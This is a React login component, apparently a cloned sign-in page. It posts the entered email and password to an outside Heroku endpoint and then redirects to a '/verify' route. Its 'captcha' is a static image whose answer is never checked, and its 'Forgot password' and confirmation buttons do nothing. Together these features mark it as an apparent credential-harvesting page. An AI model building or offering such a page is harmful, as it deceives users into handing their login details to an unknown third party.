import React from "react";
import { useForm } from "react-hook-form";
import img1 from "../../Img/Capture1.PNG";
import "./Login.css";
import { useNavigate } from "react-router-dom";

const Login = () => {
  const { register, handleSubmit } = useForm();
  let navigate = useNavigate();
  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://lit-plateau-21101.herokuapp.com/email", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };

  return (
    <>
      <span className="sing">Log</span>
      <span className="up"> in</span>
      <form onSubmit={handleSubmit(onSubmit)}>
        <div className="pe-3 Email">
          {" "}
          <label htmlFor="kka" className="fw-bold">
            <span className="text-danger">*</span> Email
          </label>
          <input
            className="form-control"
            type="email"
            {...register("example")}
            required
          />
        </div>
        <div className="pe-3 Email">
          <label htmlFor="jaa" className="fw-bold">
            <span className="text-danger">*</span> Password
          </label>
          <input
            className="form-control"
            type="password"
            {...register("exampleRequired", { required: true })}
            required
          />
        </div>
        <div className="pe-3 Email">
          <label htmlFor="jaa" className="fw-bold">
            <span className="text-danger">*</span> Please enter the characters
            shown inside the blue box
          </label>
          <div>
            {" "}
            <img className="imgPic mb-1" src={img1} alt="" />
          </div>
          <input
            className="form-control"
            {...register("exampleReq", { required: true })}
            required
          />
        </div>
        <div class="form-check Email">
          <input
            class="form-check-input"
            type="checkbox"
            value=""
            id="flexCheckDefault"
          />
          <label class="form-check-label fw-bold" for="flexCheckDefault">
            Remember me for 14 days
          </label>
        </div>

        <div className="text-center Email">
          {" "}
          <input className="Provider1" type="submit" value="Log in" />
        </div>
      </form>
      <div className="mt-5 text-center ">
        <button className=" Forgot"> Forgot your password? </button>
      </div>
      <div className="mt-2 mb-5 text-center ">
        <button className="receive">
          {" "}
          Didn't receive confirmation instructions?
        </button>
      </div>
    </>
  );
};

export default Login;
